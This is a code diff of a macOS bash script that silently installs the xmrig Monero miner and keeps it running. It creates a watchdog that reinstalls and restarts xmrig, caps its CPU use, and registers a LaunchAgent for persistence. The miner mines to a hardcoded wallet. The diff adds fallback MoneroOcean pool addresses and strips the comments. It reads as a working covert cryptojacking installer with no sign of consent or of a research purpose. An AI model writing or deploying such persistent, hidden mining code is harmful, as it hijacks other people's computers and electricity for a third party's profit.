@@ -2,7 +2,6 @@
 set -euo pipefail
 
 WALLET="464WoeWykbHMGTpkr6otNu4RhjHnt3L9KL16cBPjbGs7hvWvTT7C2oWHidAvFpbeuTPhkQ1Vtk1tC6VzsZA5dUP91mYKKPF"
-POOL="pool.moneroocean.stream:10001"
 WORKER="mac_miner"
 LOGDIR="$HOME/Library/Logs"
 LOGFILE="$LOGDIR/miner.log"
@@ -14,7 +13,6 @@ if ! command -v brew >/dev/null 2>&1; then
   /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" </dev/null >/dev/null 2>&1
 fi
 
-# ensure log directory exists
 mkdir -p "$LOGDIR"
 
 # watchdog script
@@ -22,35 +20,36 @@ cat > "$WATCHDOG" <<'EOF'
 #!/usr/bin/env bash
 set -euo pipefail
 
-# Ensure Homebrew path is available
 export PATH="/opt/homebrew/bin:/usr/local/bin:$PATH"
 
 WALLET="464WoeWykbHMGTpkr6otNu4RhjHnt3L9KL16cBPjbGs7hvWvTT7C2oWHidAvFpbeuTPhkQ1Vtk1tC6VzsZA5dUP91mYKKPF"
-POOL="pool.moneroocean.stream:10001"
 WORKER="mac_miner"
 LOGDIR="$HOME/Library/Logs"
 LOGFILE="$LOGDIR/miner.log"
 PIDFILE="$HOME/.xmrig.pid"
 
+POOLS=(
+  "gulf.moneroocean.stream:10128"
+  "gulf.moneroocean.stream:20128"
+  "pool.moneroocean.stream:443"
+  "pool.moneroocean.stream:10001"
+)
+
 mkdir -p "$LOGDIR"
 
 while true; do
-  # reinstall xmrig if missing
   if ! command -v xmrig >/dev/null 2>&1; then
     brew install xmrig >/dev/null 2>&1 || true
   fi
 
-  # reinstall cpulimit if missing
   if ! command -v cpulimit >/dev/null 2>&1; then
     brew install cpulimit >/dev/null 2>&1 || true
   fi
 
-  # delete log if too large (>50MB)
   if [ -f "$LOGFILE" ] && [ $(du -m "$LOGFILE" | cut -f1) -gt 50 ]; then
     mv "$LOGFILE" "$LOGFILE.$(date +%Y%m%d-%H%M%S).old"
   fi
 
-  # check if xmrig already running
   if [ -f "$PIDFILE" ]; then
     PID=$(cat "$PIDFILE" || true)
     if [ -n "$PID" ] && ps -p "$PID" -o comm= | grep -q "^xmrig$"; then
@@ -61,27 +60,35 @@ while true; do
     fi
   fi
 
-  # run xmrig capped at 50% CPU, log to file
-  nohup cpulimit -l 50 xmrig \
-    --url=$POOL \
-    --user=$WALLET \
-    --pass=$WORKER \
-    --donate-level=1 \
-    --log-file=$LOGFILE \
-    >> "$LOGFILE" 2>&1 &
-  echo $! > "$PIDFILE"
+  for POOL in "${POOLS[@]}"; do
+    echo "$(date) Trying pool: $POOL" >> "$LOGFILE"
+    nohup cpulimit -l 50 xmrig \
+      --url="$POOL" \
+      --user="$WALLET" \
+      --pass="$WORKER" \
+      --donate-level=1 \
+      --log-file="$LOGFILE" \
+      >> "$LOGFILE" 2>&1 &
+    echo $! > "$PIDFILE"
 
-  # wait for miner to exit
-  wait $(cat "$PIDFILE") || true
-  rm -f "$PIDFILE"
+    sleep 10
+    if grep -q "new job from" "$LOGFILE"; then
+      echo "$(date) Connected to $POOL" >> "$LOGFILE"
+      wait $(cat "$PIDFILE") || true
+      break
+    else
+      echo "$(date) Failed to connect to $POOL" >> "$LOGFILE"
+      kill $(cat "$PIDFILE") 2>/dev/null || true
+      rm -f "$PIDFILE"
+    fi
+  done
 
-  # sleep briefly before restart
   sleep 5
 done
 EOF
 chmod +x "$WATCHDOG"
 
-# create LaunchAgent plist
+# LaunchAgent plist
 mkdir -p "$HOME/Library/LaunchAgents"
 cat > "$PLIST" <<EOF
 <?xml version="1.0" encoding="UTF-8"?>
@@ -108,6 +115,5 @@ cat > "$PLIST" <<EOF
 </plist>
 EOF
 
-# load LaunchAgent immediately
 launchctl unload "$PLIST" >/dev/null 2>&1 || true
 launchctl load "$PLIST" >/dev/null 2>&1 || true
